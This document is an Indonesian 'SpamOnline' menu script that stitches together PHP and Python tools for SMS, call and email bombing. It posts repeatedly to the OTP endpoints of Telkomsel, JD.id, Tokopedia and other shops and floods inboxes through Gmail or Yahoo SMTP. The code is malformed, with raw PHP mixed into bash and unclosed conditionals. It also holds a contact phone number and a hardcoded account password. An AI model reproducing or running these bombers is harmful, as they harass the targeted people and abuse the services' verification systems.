#!/system/xbin/bash
clear
figlet Kaneki | lolcat
figlet Cyber | lolcat
figlet Ghost | lolcat
toilet -f slant --gay "SpamOnline"
sleep 1
echo "\033[31;1m Macam-macam tool untuk spam"
sleep 1
echo "\033[33;1m Author: Mr.OneJack"
sleep 1
echo "\033[32;1m contact : +6281775141230"
sleep 1
echo "\033[34;1m Kaneki Cyber Ghost"
sleep 1
echo "\033[36;1m Spam Yang Tersedia :"
echo "1. Tokopedia"
echo "2. Telkomnyet"
echo "3. Matahari Mall"
echo "4. PHD"
echo "5. Jd.Id"
echo "6. Email Bomber"
echo "0. Keluar"
echo "\033[30;1m81. Informasi Tool Ini"
echo "\033[33;1m Pilih Angka:"
read KCG
if [ $KCG = 1 ] || [ $KCG = 1 ]
then
clear
echo "\033[34;1m"
figlet "tokopedia"
<?php
include 'func.php';
/*
    https://github.com/nee48/BomTelpSmsTokped
    Made by Handika Pratama
*/
$init = new Bom();
//Eksekusi Call/Sms Boomber (Limit 100x/Jam)
echo "Nomor Target : ";
$a = trim(fgets(STDIN));
$init->no = "$a";
$init->type = 2; //Type 2 untuk telpon, Type 1 untuk sms
//$init->no = "0895371761108"; //Nomer Hp tujuan
if ($init->type == 1) {
	for ($i=0; $i < 2; $i++) { 
	    $init->Verif($init->no,$init->type);
	}
}elseif ($init->type == 2) {
	 $init->Verif($init->no,$init->type);
}


if
[ $KCG = 2 ] || [ $KCG = 2 ]
then
clear
echo "\033[31;1m"
toilet "T-Sel"
<?php
function telkbomb($no, $jum, $wait){
    $x = 0; 
    while($x < $jum) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"https://tdwidm.telkomsel.com/passwordless/start");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone_number=%2B".$no."&connection=sms");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_REFERER, 'https://my.telkomsel.com/');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $server_output = curl_exec ($ch);
        curl_close ($ch);
        echo $server_output."\n";
        sleep($wait);
        $x++;
        flush();
    }
}
echo "Nomor: ";
$nomor = trim(fgets(STDIN));
echo "Jumlah Pesan: ";
$jumlah = trim(fgets(STDIN));
echo "jeda/delay: ";
$jeda = trim(fgets(STDIN));
$execute = telkbomb($nomor, $jumlah, $jeda);
print $execute;
?>


if [ $KCG = 3 ] || [ $KCG = 3 ]
then
clear
echo "\033[31;1m"
figlet "Mthr Mall"
<?php
/*
    https://github.com/nee48/bomsmsmthrmall/
    Made by Handika Pratama
    Modified by まやちゃん
*/
include 'bommthrml.php';
$init = new Bom();
// Konfigurasi Akun Mataharimall
$init->email = "zumupolij@c1oramn.com";
$init->pass = "Hilih kintil";
$init->Login($init->email,$init->pass);
//Eksekusi Sms Boomber
echo "Nomor Target (pakai 62): ";
$a = trim(fgets(STDIN));
$init->no = "$a";
echo "Jumlah Pesan : ";
$b = trim(fgets(STDIN));
$loop = "$b";
for ($i=0; $i < $loop; $i++) { 
    $init->Verif($init->no);
}



if [ $KCG = 4 ] || [ $KCG = 4 ]
then
clear
toilet -f mono12 -F gay "PHD"
echo "\033[30;1m"
<?php
include 'bomphd.php';
/*
    https://github.com/nee48/BomSmsPhD
    Made by Handika Pratama
    Modified by まやちゃん
*/
$init = new Bom();
//Eksekusi Sms Boomber
echo "Nomor Target (pakai 62): ";
$a = trim(fgets(STDIN));
$init->no = "$a";
echo "Jumlah Pesan: ";
$b = trim(fgets(STDIN));
$loop = "$b";
for ($i=0; $i < $loop; $i++) {
    $init->Verif($init->no);
}


if
[ $KCG = 5 ] || [ $KCG = 5 ]
then
clear
toilet -f mono12 -F gay "Jd.Id"
echo "\033[33;1m"
<?php
function jdidbom($no, $jum, $wait){
    $x = 0; 
    while($x < $jum) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"http://sc.jd.id/phone/sendPhoneSms");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=".$no."&smsType=1");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_REFERER, 'http://sc.jd.id/phone/bindingPhone.html');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $server_output = curl_exec ($ch);
        curl_close ($ch);
		echo $server_output."\n";
        sleep($wait);
        $x++;
        flush();
    }
}
echo "Nomor Target : ";
$nomor = trim(fgets(STDIN));
echo "Jumlah Pesan: ";
$jumlah = trim(fgets(STDIN));
echo "Jeda : ";
$jeda = trim(fgets(STDIN));
$execute = jdidbom($nomor, $jumlah, $jeda);
print $execute;
?>


if
[ $KCG = 6 ] || [ $KCG = 6 ]
then
clear
toilet -f standard -F gay "Email Bomber"
echo "\033[36;1m"
#!/usr/bin/python
#Bomb-Email
#This code for education purpose only.
#Use it at your own risk !!!


import os
import smtplib
import getpass
import sys


server = raw_input ('Pilih Gmail/Yahoo?: ')
user = raw_input('Emailmu: ')
passwd = getpass.getpass('Passwordmu: ')


to = raw_input('\nMasukan Email Target: ')
#subject = raw_input('Subject: ') 
body = raw_input('Pesan Spam?: ')
total = input('Berapa: ')

if server == 'gmail':
    smtp_server = 'smtp.gmail.com'
    port = 587
elif server == 'yahoo':
    smtp_server = 'smtp.mail.yahoo.com'
    port = 25
else:
    print 'Applies only to gmail and yahoo.'
    sys.exit()

print ''

try:
    server = smtplib.SMTP(smtp_server,port) 
    server.ehlo()
    if smtp_server == "smtp.gmail.com":
            server.starttls()
    server.login(user,passwd)
    for i in range(1, total+1):
        subject = os.urandom(9)
        msg = 'From: ' + user + '\nSubject: ' + subject + '\n' + body
        server.sendmail(user,to,msg)
        print "\rE-mails sent: %i" % i
        sys.stdout.flush()
    server.quit()
    print '\n LiteSpam Sukses!!!'
except KeyboardInterrupt:
    print '[-] Canceled'
    sys.exit()
except smtplib.SMTPAuthenticationError:
    print '\n[!] Mungkin Nama Pengguna Dan Sandi Email Anda Salah'
    sys.exit()


if
[ $KCG = 81 ] || [ $KCG = 81 ]
then
clear
toilet -f slant --gay "SpamOnline"
echo "\033[31;1mNama tools: SpamOnline"
sleep 1
echo "\033[33;1mKarya: Mr.OneJack"
sleep 1
echo "\033[32;1mVersi: v1"
sleep 1
echo "\033[36;1mTeam: Kaneki Cyber Ghost"
sleep 1
echo "\033[31;1m Spesial Thanks To: "
echo "\033[36;1m"
echo "Mr.plug1n"
echo "MR.4Z13X"
echo "MR.Y05H"
echo "MR.RANSX"
echo "MR.W1LD"
sleep 1
echo "And All Member Kaneki Cyber Ghost"
echo "\033[30;1m tunggu 8 detik"
sleep 8
sh SpamOnline.sh
fi

if
[ $KCG = 0 ] || [ $KCG = 0 ]
then
echo "\033[31;1m Keluar"
sleep 1
echo "\033[32;1m Dadah Kentod :)"
sleep 1
fi
